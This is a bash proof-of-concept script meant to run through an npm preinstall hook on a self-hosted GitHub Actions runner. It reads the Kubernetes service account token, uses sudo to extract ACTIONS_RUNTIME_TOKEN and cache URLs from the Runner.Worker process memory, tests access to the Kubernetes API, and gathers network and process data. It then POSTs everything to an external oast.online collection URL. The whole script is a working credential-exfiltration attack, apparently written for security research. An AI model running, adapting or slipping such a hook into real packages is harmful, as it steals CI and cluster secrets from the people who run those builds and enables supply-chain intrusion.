#!/bin/bash
# PoC: Infrastructure reconnaissance on self-hosted ARC runner
# This script runs during npm ci via the preinstall hook

EXFIL_URL="https://d78mjgej5fjmq8ifvrk0gcxrj7c5aqemt.oast.online/collect"

# === 1. Runner environment ===
echo "[*] Runner environment"
RUNNER_INFO=$(cat <<ENVEOF
hostname=$(hostname)
whoami=$(whoami)
id=$(id)
uname=$(uname -a)
runner_name=${RUNNER_NAME:-unknown}
runner_os=${RUNNER_OS:-unknown}
github_repository=${GITHUB_REPOSITORY}
github_event=${GITHUB_EVENT_NAME}
github_actor=${GITHUB_ACTOR}
github_ref=${GITHUB_REF}
ENVEOF
)

# === 2. Kubernetes service account token ===
echo "[*] K8s service account token"
K8S_TOKEN=""
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    K8S_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    K8S_NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
    K8S_CA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | base64 -w0)
fi

# === 3. ACTIONS_RUNTIME_TOKEN (from Runner.Worker memory) ===
echo "[*] Extracting ART from Runner.Worker"
WORKER_PID=$(pgrep -f 'Runner.Worker' 2>/dev/null | head -1)
ART=""
if [ -n "$WORKER_PID" ]; then
    # sudo is available (disable-sudo: false)
    ART=$(sudo strings /proc/$WORKER_PID/environ 2>/dev/null | grep '^ACTIONS_RUNTIME_TOKEN=' | head -1 | cut -d= -f2-)
    CACHE_URL=$(sudo strings /proc/$WORKER_PID/environ 2>/dev/null | grep '^ACTIONS_CACHE_URL=' | head -1 | cut -d= -f2-)
    RESULTS_URL=$(sudo strings /proc/$WORKER_PID/environ 2>/dev/null | grep '^ACTIONS_RESULTS_URL=' | head -1 | cut -d= -f2-)
fi

# === 4. Docker availability ===
echo "[*] Docker check"
DOCKER_INFO=$(docker info 2>&1 | head -20 || echo "Docker not available")

# === 5. Network reconnaissance ===
echo "[*] Network scan"
NETWORK_INFO=$(ip addr 2>/dev/null || ifconfig 2>/dev/null)
DNS_INFO=$(cat /etc/resolv.conf 2>/dev/null)

# === 6. Kubernetes API probe ===
echo "[*] K8s API probe"
K8S_API_RESULT=""
if [ -n "$K8S_TOKEN" ]; then
    APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
    
    # Test: Can we list secrets?
    K8S_API_RESULT=$(curl -sk \
        -H "Authorization: Bearer $K8S_TOKEN" \
        "$APISERVER/api/v1/namespaces/$K8S_NAMESPACE/secrets" \
        -o /dev/null -w "%{http_code}" 2>/dev/null)
    
    # Test: Can we list pods?
    K8S_PODS=$(curl -sk \
        -H "Authorization: Bearer $K8S_TOKEN" \
        "$APISERVER/api/v1/namespaces/$K8S_NAMESPACE/pods" \
        -o /dev/null -w "%{http_code}" 2>/dev/null)
    
    # Test: Can we list all namespaces?
    K8S_NS=$(curl -sk \
        -H "Authorization: Bearer $K8S_TOKEN" \
        "$APISERVER/api/v1/namespaces" \
        -o /dev/null -w "%{http_code}" 2>/dev/null)
fi

# === 7. Process listing (look for interesting processes) ===
echo "[*] Process listing"
PROC_LIST=$(ps auxww 2>/dev/null | head -50)

# === Exfiltrate ===
curl -sk -X POST "$EXFIL_URL" \
    -H "Content-Type: application/json" \
    -d "$(cat <<JSON
{
    "runner_info": $(echo "$RUNNER_INFO" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read()))'),
    "k8s_token": "$K8S_TOKEN",
    "k8s_namespace": "$K8S_NAMESPACE",
    "k8s_secrets_access": "$K8S_API_RESULT",
    "k8s_pods_access": "$K8S_PODS",
    "k8s_namespaces_access": "$K8S_NS",
    "actions_runtime_token": "$ART",
    "actions_cache_url": "$CACHE_URL",
    "actions_results_url": "$RESULTS_URL",
    "docker_info": $(echo "$DOCKER_INFO" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read()))'),
    "network_info": $(echo "$NETWORK_INFO" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read()))'),
    "process_list": $(echo "$PROC_LIST" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read()))')
}
JSON
)" 2>/dev/null || true

echo "[*] Reconnaissance complete"
